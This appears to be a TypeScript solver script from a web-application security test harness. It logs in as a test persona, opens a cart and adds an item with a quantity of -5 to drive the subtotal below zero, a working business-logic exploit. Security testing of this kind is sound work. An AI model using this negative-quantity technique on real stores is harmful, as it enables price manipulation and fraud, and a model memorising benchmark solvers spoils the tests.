// Open a cart, then add a line with a negative quantity so the cart subtotal is driven below zero.
import { buildPath } from '../../truth/matrix-helpers.ts'
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const created = await ctx.fetch(buildPath(ctx.plan, 'createCart'), {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: '{}',
  })
  const cart = (await created.json().catch(() => ({}))) as { id?: string }
  if (!cart.id) return
  const qtyField = ctx.plan.params['itemQty'] ?? 'qty'
  await ctx.fetch(buildPath(ctx.plan, 'addCartItem', { cartId: cart.id }), {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ [qtyField]: -5 }),
  })
}
